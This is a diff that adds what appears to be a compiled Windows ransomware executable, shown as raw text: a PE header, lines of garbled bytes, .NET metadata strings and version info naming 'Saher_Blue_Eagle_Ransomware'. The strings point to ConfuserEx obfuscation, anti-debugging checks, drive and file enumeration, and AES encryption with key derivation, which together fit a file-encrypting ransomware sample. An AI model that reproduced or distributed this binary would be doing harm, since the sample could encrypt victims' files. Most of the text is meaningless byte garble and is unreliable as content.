@@ -1,0 +1,687 @@
+!This program cannot be run in DOS mode.
+NYggfn9b$
+`.rsrc
+@.reloc
+%3&9w\7
+ZYs1~u
+i@wE`Dt
+!3LBC/
+E-Tb+<*K
+VNHnjHi&N3
+etWS_G
+J9bidh
+,3m(xfs
+]qg7w
+{9e^4M
+9<_G*(
+>%qDs}P
+!#:a{>
+/y:d~TL|
+qM;l-g
+$/L$`J
+#-B8a:
+u$%<9Ib
+J]Ez3
+sRQG",O
+$z&Pf/
++Dm!O(
+m ,e,Y
+K&GMMlP
+Lt/Ems
+_P6*D\
+!F3Xk?
+Ta#Zx
+&3w}w*
+)|3JY(
+rLxg@Wo
+<q*D]v
+ I1=h
+J;cGr8kE
+SE;?&(
+Ty?"&@
+nRwu70
+fuleQ=
+`VBh'=
+fiO9WB
+&6<rj?J
+jv!0VU
+# @r6w
+i5'+trG
+_bA]^:
+o2~MLpw
+\iaEz@
+F(UL\,
+dzk"%y
+, &f*+:
+EqEoiun
+gWGGHgH
+$rdM@=
+Zn6p*=
+{hub$]
+]A}jl[
+r1h~;o
+D@.dzit
+wJU9k!
+0xJsGj
+f yB!/",@
+;s6%?X
+AX=t^s%&
+SCx0|x
+'nS'lrM3.
+a)[[&x
+gVF}`(
+(etC?$
+iaCYYZ
+TB#/`m
+}3ix~i
+:7x|.^b
+_G?+I(`
+#VVelgt
+Uo-y/e
+%rvICh
+8I#oqQ]J
+*C'F5
+/eE_F+
+E=%UO[
+l=sP\4
+r1rL~$
+Z7PQ7P{
+ZUlO?E5.
+a5(xpS
+]@O$iU
+h]QS:H+\Z
+t' O7c|
+3'Dp-y
+tU6:Y
+G<Nom~
+?^5+f,
+ 7YUNz
+X$h+,J
++IOOMG
+jIJu.wz
+Ju6kgC
+8d.Oc#
+mxMc_{~
+Mj66#>
+nS?cC/
+A u e'O
+W'.J9S1??
+g[_G#u
+7:yRvIh@
+VO=n2Q
+4>W N)
+y{cufV^
+{VT}hD
+WT&!.(#
+1kb.|JE
+cu$KBJ
+``:t./
+Q]D{svO
+wu>`F?
+IUvWhd8e
+T@>H6=
+vB8.e:s
+yfZ["u'
+h0[oL0
+jy2c(vQ#
+*M_2xV8
+"{NwA4
+/4eAO4
+[;E1@2b
+oEd-&K
+%Y!r10MDt
+2[_BN.
+bY~Yjua
+)/^R%_
+J#V0nh
+\i0v`j
+sJWSJ[
+4cz)%e
+]<VM1{
+>Ay3|$
+@YT]}
+(Z(=SG
+6p2z*K
+']<8H/
+|ZB"r4]
+VaW|`|
+;}q9sf
+Sc(Al&
+ H}ZmO
+H3!3_o&
+Cs]DiV}
+%I#{#k
+p;@9n$sUCO:
+=[?O?>
+93zOX)R
+=ONUL%
+n4 +7DH
+#%"8Z}
+z}}m ]
+YIwMMEW
+Wpr]'fm
+/N3SI.k
+C}X`-
+Ri\<LF
+l~<m!dLj
+^8!nS'
+;`f1>G
+ho7BNc
+!N--$`
+:]T|lKG
+hnipVdy
+K3Zccn
+m!TA<]
+V#L&L\
+Vz2p=K1
+Z+{dYO
+A>9Z [
+ UQKMZ ^NH
+_CorExeMain
+mscoree.dll
+v2.0.50727
+#Strings
+Saher_Blue_Eagle_Ransomware.exe
+mscorlib
+SuppressIldasmAttribute
+System.Runtime.CompilerServices
+<Module>
+Assembly
+System.Reflection
+.cctor
+VirtualProtect
+kernel32.dll
+System
+RuntimeTypeHandle
+MethodInfo
+MethodBase
+Thread
+System.Threading
+ParameterizedThreadStart
+Module
+ResolveEventArgs
+ValueType
+Object
+Stream
+System.IO
+Microsoft.VisualBasic
+WindowsFormsApplicationBase
+Microsoft.VisualBasic.ApplicationServices
+OnCreateMainForm
+Computer
+Microsoft.VisualBasic.Devices
+Hashtable
+System.Collections
+Equals
+GetHashCode
+ToString
+ArgumentException
+InvalidOperationException
+Exception
+''$2NV$ X%my?hmU|(z"((j#"
+System.Windows.Forms
+IContainer
+System.ComponentModel
+RichTextBox
+TextBox
+PictureBox
+Random
+Dispose
+SystemParametersInfoA
+user32
+SetWindowPos
+MouseEventArgs
+EventArgs
+FormClosingEventArgs
+FormClosingEventHandler
+EventHandler
+IDisposable
+ComponentResourceManager
+Control
+ISupportInitialize
+ResourceManager
+System.Resources
+System.Drawing
+ImageLayout
+ControlCollection
+DockStyle
+TextBoxBase
+BorderStyle
+FontStyle
+GraphicsUnit
+PictureBoxSizeMode
+ContainerControl
+AutoScaleMode
+FormBorderStyle
+MouseEventHandler
+Environment
+SpecialFolder
+FileSystemProxy
+Microsoft.VisualBasic.MyServices
+ServerComputer
+FileInfo
+Process
+System.Diagnostics
+ProcessStartInfo
+OpenMode
+OpenAccess
+OpenShare
+CompareMethod
+MemoryStream
+ImageFormat
+System.Drawing.Imaging
+ThreadStart
+Encoding
+System.Text
+SHA256
+System.Security.Cryptography
+HashAlgorithm
+RijndaelManaged
+SymmetricAlgorithm
+Rfc2898DeriveBytes
+CipherMode
+ICryptoTransform
+CryptoStream
+CryptoStreamMode
+AppWinStyle
+ProcessWindowStyle
+MouseButtons
+StringBuilder
+ConsoleColor
+ProcessModule
+DirectoryInfo
+CloseReason
+CancelEventArgs
+DialogResult
+MessageBoxButtons
+MessageBoxIcon
+IEnumerator
+FormWindowState
+FindWindow
+user32.dll
+GetWindow
+IsWindowVisible
+DriveInfo
+DriveType
+FileAttributes
+FileSystemInfo
+RegistryKey
+Microsoft.Win32
+CultureInfo
+System.Globalization
+MySettings
+Saher_Blue_Eagle_Ransomware.My
+ApplicationSettingsBase
+System.Configuration
+SettingsBase
+ShutdownEventHandler
+Default
+ConfusedByAttribute
+Attribute
+Saher_Blue_Eagle_Ransomware
+AssemblyDescriptionAttribute
+DebuggableAttribute
+DebuggingModes
+CompilationRelaxationsAttribute
+AssemblyCompanyAttribute
+RuntimeCompatibilityAttribute
+AssemblyFileVersionAttribute
+AssemblyProductAttribute
+GuidAttribute
+System.Runtime.InteropServices
+AssemblyTitleAttribute
+ComVisibleAttribute
+AssemblyTrademarkAttribute
+AssemblyCopyrightAttribute
+GeneratedCodeAttribute
+System.CodeDom.Compiler
+EditorBrowsableAttribute
+EditorBrowsableState
+DebuggerHiddenAttribute
+STAThreadAttribute
+DebuggerStepThroughAttribute
+StandardModuleAttribute
+Microsoft.VisualBasic.CompilerServices
+HideModuleNameAttribute
+HelpKeywordAttribute
+System.ComponentModel.Design
+MyGroupCollectionAttribute
+ThreadStaticAttribute
+CompilerGeneratedAttribute
+DesignerGeneratedAttribute
+AccessedThroughPropertyAttribute
+DebuggerNonUserCodeAttribute
+Saher_Blue_Eagle_Ransomware.Resources.resources
+eRqcyHHJDmUmOneBLFGDGHopMyGNA
+''$2NV$ X%my?hmU|(z"((j#".resources
+String
+UInt32
+IntPtr
+op_Explicit
+GetTypeFromHandle
+GetMethod
+Concat
+Invoke
+FailFast
+set_IsBackground
+get_CurrentThread
+Debugger
+get_IsAttached
+IsLogging
+get_IsAlive
+get_Module
+Marshal
+GetHINSTANCE
+get_FullyQualifiedName
+get_Chars
+get_Length
+ReadByte
+RuntimeHelpers
+InitializeArray
+RuntimeFieldHandle
+Buffer
+BlockCopy
+get_UTF8
+GetString
+Intern
+GetElementType
+CreateInstance
+AppDomain
+get_CurrentDomain
+ResolveEventHandler
+add_AssemblyResolve
+get_FullName
+get_Name
+op_Equality
+get_UseCompatibleTextRendering
+AuthenticationMode
+set_IsSingleInstance
+set_EnableVisualStyles
+set_ShutdownStyle
+ShutdownMode
+set_MainForm
+Application
+SetCompatibleTextRenderingDefault
+set_SaveMySettingsOnExit
+TargetInvocationException
+get_IsDisposed
+Activator
+Component
+ContainsKey
+GetResourceString
+ProjectData
+SetProjectError
+get_InnerException
+get_Message
+Remove
+GetObjectValue
+get_Snow
+get_Transparent
+FromArgb
+get_Lime
+get_Left
+Cursor
+get_Position
+get_Top
+set_Top
+set_Left
+Cursors
+get_Default
+set_Cursor
+add_FormClosing
+add_Load
+get_UserName
+get_MachineName
+SuspendLayout
+BeginInit
+GetObject
+set_BackgroundImage
+set_BackgroundImageLayout
+get_Controls
+set_Dock
+set_Location
+set_Name
+set_Size
+set_TabIndex
+set_BackColor
+set_Image
+set_BorderStyle
+set_Font
+set_ForeColor
+set_ReadOnly
+set_Text
+set_AutoSize
+set_Multiline
+SystemColors
+get_ActiveCaptionText
+set_SizeMode
+set_TabStop
+set_AutoScaleDimensions
+set_AutoScaleMode
+set_ClientSize
+set_FormBorderStyle
+ResumeLayout
+EndInit
+PerformLayout
+remove_MouseMove
+remove_MouseUp
+remove_MouseDown
+add_MouseMove
+add_MouseUp
+add_MouseDown
+remove_Click
+add_Click
+GetFolderPath
+get_ExecutablePath
+get_FileSystem
+GetFileInfo
+get_StartupPath
+Replace
+ClearProjectError
+set_Verb
+set_UseShellExecute
+set_StartInfo
+FileSystem
+FileOpen
+Strings
+FileGet
+FileClose
+get_Text
+Convert
+FromBase64String
+Monitor
+FromStream
+get_Image
+get_Jpeg
+Directory
+GetFiles
+GetDirectories
+GetExtension
+Contains
+CreateProjectError
+ReadAllBytes
+GetBytes
+Create
+ComputeHash
+WriteAllBytes
+set_KeySize
+set_BlockSize
+get_KeySize
+set_Key
+get_BlockSize
+set_IV
+set_Mode
+CreateEncryptor
+ToArray
+Interaction
+GetProcesses
+get_ProcessName
+set_WindowStyle
+set_CreateNoWindow
+set_Arguments
+get_Button
+Append
+get_Lines
+WriteAllLines
+Console
+set_ForegroundColor
+GetCurrentProcess
+get_MainModule
+get_FileName
+Delete
+Conversions
+CreateDirectory
+WriteLine
+set_CheckForIllegalCrossThreadCalls
+Exists
+EndApp
+get_CloseReason
+set_Cancel
+MessageBox
+GetValues
+GetEnumerator
+get_Current
+ToInteger
+MoveNext
+set_Opacity
+set_WindowState
+set_ShowInTaskbar
+set_ShowIcon
+Boolean
+CreateObject
+NewLateBinding
+LateCall
+ChangeType
+Registry
+LocalMachine
+GetDrives
+get_IsReady
+get_DriveType
+SetAttributes
+ToLower
+EndsWith
+set_Attributes
+get_TotalFreeSpace
+Operators
+CompareString
+LateGet
+LateSetComplex
+GetFileNameWithoutExtension
+OpenSubKey
+GetValue
+ConcatenateObject
+ReferenceEquals
+get_Assembly
+Synchronized
+get_SaveMySettingsOnExit
+ObjectFlowControl
+CheckForSyncLockOnValueType
+add_Shutdown
+ConfuserEx v1.0.0
+Saher_Blue_Eagle_Ransomware
+Saher_Blue_Eagle
+WrapNonExceptionThrows
+1.0.0.0
+$8487a386-df22-4a3a-93c7-c396558e3390
+Copyright 
+  2017
+MyTemplate
+8.0.0.0
+My.Computer
+My.Application
+My.User
+My.Forms
+My.WebServices
+System.Windows.Forms.Form
+Create__Instance__
+Dispose__Instance__
+My.MyProject.Forms
+4System.Web.Services.Protocols.SoapHttpClientProtocol
+Create__Instance__
+Dispose__Instance__
+Panel1
+Panel2
+Label1
+Label2
+RichTextBox2
+Label3
+TextBox1
+Label10
+Label8
+Label4
+PictureBox1
+3System.Resources.Tools.StronglyTypedResourceBuilder
+4.0.0.0
+KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator
+10.0.0.0
+My.Settings
+<?xml version="1.0" encoding="utf-8"?>
+<asmv1:assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <!-- UAC Manifest Options
+            If you want to change the Windows User Account Control level replace the 
+            requestedExecutionLevel node with one of the following.
+        <requestedExecutionLevel  level="asInvoker" uiAccess="false" />
+        <requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />
+        <requestedExecutionLevel  level="highestAvailable" uiAccess="false" />
+            Specifying requestedExecutionLevel node will disable file and registry virtualization.
+            If you want to utilize File and Registry Virtualization for backward 
+            compatibility then delete the requestedExecutionLevel node.
+        -->
+        <requestedExecutionLevel level="asInvoker" uiAccess="false" />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
+    <application>
+      <!-- A list of all Windows versions that this application is designed to work with. Windows will automatically select the most compatible environment.-->
+      <!-- If your application is designed to work with Windows 7, uncomment the following supportedOS node-->
+      <!--<supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/>-->
+      
+    </application>
+  </compatibility>
+  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->
+  <!-- <dependency>
+    <dependentAssembly>
+      <assemblyIdentity
+          type="win32"
+          name="Microsoft.Windows.Common-Controls"
+          version="6.0.0.0"
+          processorArchitecture="*"
+          publicKeyToken="6595b64144ccf1df"
+          language="*"
+        />
+    </dependentAssembly>
+  </dependency>-->
+</asmv1:assembly>
+abccba3A94A8A7fp2cWhP9JG1HArQKwLPFQ8DDwSabccba/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAMABVYDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDzLA9BUjW0qIHeF1U9GKkCtnwxaRXF7JJIobylBUH1PeuvdFkQo6hlIwQRwazq4nklypHs4HJ/rNH2spWvseZ4HoKckTSOEjjLseiqMk1a1O3S11KeGP7itx7DrXdeB7CCLSPtu0GeZmBYjkAHGK
+abccba
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+Comments
+Saher_Blue_Eagle_Ransomware
+CompanyName
+Saher_Blue_Eagle
+FileDescription
+Saher_Blue_Eagle_Ransomware
+FileVersion
+1.0.0.0
+InternalName
+Saher_Blue_Eagle_Ransomware.exe
+LegalCopyright
+Copyright 
+  2017
+OriginalFilename
+Saher_Blue_Eagle_Ransomware.exe
+ProductName
+Saher_Blue_Eagle_Ransomware
+ProductVersion
+1.0.0.0
+Assembly Version
+1.0.0.0
